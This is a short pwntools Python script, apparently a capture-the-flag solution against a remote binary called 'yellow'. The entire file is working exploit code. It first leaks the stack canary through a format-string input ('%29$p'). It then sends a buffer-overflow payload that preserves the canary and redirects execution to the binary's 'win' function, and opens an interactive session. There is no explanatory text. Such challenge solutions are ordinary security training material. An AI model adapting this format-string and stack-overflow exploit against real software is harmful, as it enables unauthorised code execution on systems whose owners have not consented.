from pwn import *

exe = './yellow'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

offset = 24

p = remote('tcp.ybn.sg', 25749)
p.sendlineafter('?', '%29$p')
print(p.recvline())
resp = p.recvline()
canary = resp.split(b':')[1].strip()
canary = int(canary, 16)
info('canary = 0x%x (%d)', canary, canary)

payload = flat([
	offset * b'A',
	canary,
	8 * b'A',
	elf.symbols.win
])

p.sendlineafter('?', payload)
p.interactive()
